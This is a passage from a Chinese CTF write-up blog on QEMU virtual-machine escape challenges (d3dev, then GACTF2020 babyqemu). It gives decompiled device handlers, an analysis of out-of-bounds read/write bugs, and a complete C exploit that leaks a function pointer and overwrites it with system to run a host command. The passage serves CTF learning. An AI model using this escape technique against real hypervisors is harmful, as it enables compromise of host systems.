class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">-1LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="d3dev-pmio-write"><a href="#d3dev-pmio-write" class="headerlink" title="d3dev_pmio_write"></a>d3dev_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                   &amp;opaque-&gt;r_seed,</span><br><span class="line">                   <span class="number">28LL</span>,</span><br><span class="line">                   val,</span><br><span class="line">                   *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以看到在<code>d3dev_mmio_read</code>函数和<code>d3dev_mmio_write</code>函数中对数据进行了<code>tea</code>加密，而在<code>d3dev_pmio_write</code>函数中有如下代码可以令<code>key</code>的值为<code>0</code>，方便了我们进行加解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">4</span> )&#123;</span><br><span class="line">  *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>d3dev_mmio_read</code>函数中有以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = opaque-&gt;blocks[opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br></pre></td></tr></table></figure><p>可以看见程序并没有对<code>addr</code>的合法性进行检测，导致我们可以对数据进行越界读<br>在<code>d3dev_mmio_write</code>函数中存在以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">opaque-&gt;blocks[v4] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br></pre></td></tr></table></figure><p>和上面一样的问题，我们可以对该数组越界写<br>再看<code>d3dev_pmio_write</code>函数中的以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">28</span> )&#123;</span><br><span class="line">  opaque-&gt;r_seed = val;</span><br><span class="line">  key = opaque-&gt;key;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *key++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                &amp;opaque-&gt;r_seed,</span><br><span class="line">                <span class="number">28LL</span>,</span><br><span class="line">                val,</span><br><span class="line">                *(_QWORD *)&amp;size);</span><br><span class="line">  <span class="keyword">while</span> ( key != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个地方调用了函数指针<code>opaque-&gt;rand_r</code>，其第一个参数为<code>&amp;opaque-&gt;r_seed</code>，该参数在下面的代码片段中可控</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">28</span> )&#123;</span><br><span class="line">  opaque-&gt;r_seed = val;</span><br></pre></td></tr></table></figure><p>最后再看看<code>d3devState</code>结构体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000 d3devState struc ; (sizeof=0x1300, align=0x10, copyof_4545)</span><br><span class="line">00000000 pdev PCIDevice_0 ?</span><br><span class="line">000008E0 mmio MemoryRegion_0 ?</span><br><span class="line">000009D0 pmio MemoryRegion_0 ?</span><br><span class="line">00000AC0 memory_mode dd ?</span><br><span class="line">00000AC4 seek dd ?</span><br><span class="line">00000AC8 init_flag dd ?</span><br><span class="line">00000ACC mmio_read_part dd ?</span><br><span class="line">00000AD0 mmio_write_part dd ?</span><br><span class="line">00000AD4 r_seed dd ?</span><br><span class="line">00000AD8 blocks dq 257 dup(?)</span><br><span class="line">000012E0 key dd 4 dup(?)</span><br><span class="line">000012F0 rand_r dq ?                             ; offset</span><br><span class="line">000012F8 db ? ; undefined</span><br><span class="line">000012F9 db ? ; undefined</span><br><span class="line">000012FA db ? ; undefined</span><br><span class="line">000012FB db ? ; undefined</span><br><span class="line">000012FC db ? ; undefined</span><br><span class="line">000012FD db ? ; undefined</span><br><span class="line">000012FE db ? ; undefined</span><br><span class="line">000012FF db ? ; undefined</span><br><span class="line">00001300 d3devState ends</span><br></pre></td></tr></table></figure><p>现在思路就很明显了，可以通过数组越界读读取<code>rand_r</code>出原有的函数指针来泄露地址，然后在利用数组越界写来修改<code>rand_r</code>处的函数指针为<code>system</code>，最后修改<code>r_seed</code>为参数即可完成逃逸<br>这里有一个需要注意的点，我们在<code>exp</code>中访问<code>PCI</code>设备的<code>MMIO</code>空间使用的是<code>&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</code> 而不是平时的 <code>&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</code>。经过学习后我才发现原来这个并不是固定值<br>我们首先查看<code>d3dev_class_init</code>函数并将<code>v2</code>变量设置为<code>PCIDeviceClass</code>类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="type">const</span> <span class="type">char</span> *)&amp;env.tlb_table[<span class="number">1</span>][<span class="number">115</span>]._anon_0.dummy[<span class="number">31</span>],</span><br><span class="line">                           <span class="string">&quot;/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c&quot;</span>,</span><br><span class="line">                           <span class="number">229</span>,</span><br><span class="line">                           <span class="string">&quot;d3dev_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;realize = pci_d3dev_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = <span class="number">0LL</span>;</span><br><span class="line">  *(_DWORD *)&amp;v2-&gt;vendor_id = <span class="number">0x11E82333</span>;</span><br><span class="line">  v2-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在命令行中输入<code>lspci</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0200: 8086:100e</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 00ff: 2333:11e8</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure><p>我们即可通过<code>class_id</code>和<code>vendor_id</code>来找到我们所需要的<code>PCI</code>设备</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(addr+mmio_mem)) = val;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(addr+mmio_mem));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    outl(val,addr+pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">en</span><span class="params">(<span class="type">uint32_t</span> high,<span class="type">uint32_t</span> low)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9E3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        high -= (low*<span class="number">16</span>) ^ (low+sum) ^ (low&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        low -= (high*<span class="number">16</span>) ^ (high+sum) ^ (high&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)high * <span class="number">0x100000000</span> + low;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">de</span><span class="params">(<span class="type">uint32_t</span> high,<span class="type">uint32_t</span> low)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9E3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">        low += (high*<span class="number">16</span>) ^ (high+sum) ^ (high&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        high += (low*<span class="number">16</span>) ^ (low+sum) ^ (low&gt;&gt;<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)high * <span class="number">0x100000000</span> + low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">      perror(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>); <span class="comment">// opaque-&gt;seek = 0x100</span></span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0</span>); <span class="comment">// 令key为0 方便tea加解密</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;region rand_r: %p\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> randr = de(rand_r/<span class="number">0x100000000</span>,rand_r%<span class="number">0x100000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encode randr: %p\n&quot;</span>,randr);</span><br><span class="line">    <span class="type">uint64_t</span> system = randr + <span class="number">0xa5f0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system: %p\n&quot;</span>, system);</span><br><span class="line">    <span class="type">uint64_t</span> encode_system = en(system / <span class="number">0x100000000</span>, system % <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encode system: %p\n&quot;</span>, encode_system);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在rand_r写入system</span></span><br><span class="line">    mmio_write(<span class="number">24</span>,encode_system%<span class="number">0x100000000</span>); <span class="comment">//只能4字节4字节的写入</span></span><br><span class="line">    mmio_write(<span class="number">24</span>,encode_system/<span class="number">0x100000000</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">0x67616c66</span>); <span class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">28</span>,<span class="number">0x20746163</span>); <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GACTF2020-babyqemu"><a href="#GACTF2020-babyqemu" class="headerlink" title="GACTF2020 babyqemu"></a>GACTF2020 babyqemu</h2><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="denc-mmio-read"><a href="#denc-mmio-read" class="headerlink" title="denc_mmio_read"></a>denc_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">denc_mmio_read</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = addr &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="denc-mmio-write"><a href="#denc-mmio-write" class="headerlink" title="denc_mmio_write"></a>denc_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">denc_mmio_write</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> __int64)opaque;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = val ^ *(_DWORD *)&amp;opaque-&gt;key[addr];</span><br><span class="line">      opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>] = result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="denc-pmio-read"><a href="#denc-pmio-read" class="headerlink" title="denc_pmio_read"></a>denc_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">denc_pmio_read</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> || (addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="denc-pmio-write"><a href="#denc-pmio-write" class="headerlink" title="denc_pmio_write"></a>denc_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">denc_pmio_write</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (__int64)opaque;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = val ^ *(_DWORD *)&amp;opaque-&gt;key[<span class="number">4</span> * addr];</span><br><span class="line">        opaque-&gt;buf[addr] = result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">0x660</span> )</span><br><span class="line">        <span class="keyword">return</span> opaque-&gt;fun(opaque-&gt;buf, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到，在<code>denc_mmio_read</code>函数中存在数组越界读，在<code>denc_mmio_write</code>函数中纯在数组越界写。在<code>denc_pmio_write</code>函数中调用了<code>fun</code>函数，而该<code>fun</code>是一个函数指针，我们可以通过输入越界读来泄露出地址，然后再利用数组越界写来将<code>fun</code>改为<code>system@plt</code>的地址，即可实现逃逸</p><h4 id="关键结构体"><a href="#关键结构体" class="headerlink" title="关键结构体"></a>关键结构体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 DencState struc ; (sizeof=0xB48, mappedto_112)</span><br><span class="line">00000000 field_0 db 2808 dup(?)</span><br><span class="line">00000AF8 key db 32 dup(?)</span><br><span class="line">00000B18 field_B18 db 8 dup(?)</span><br><span class="line">00000B20 buf dd 8 dup(?)</span><br><span 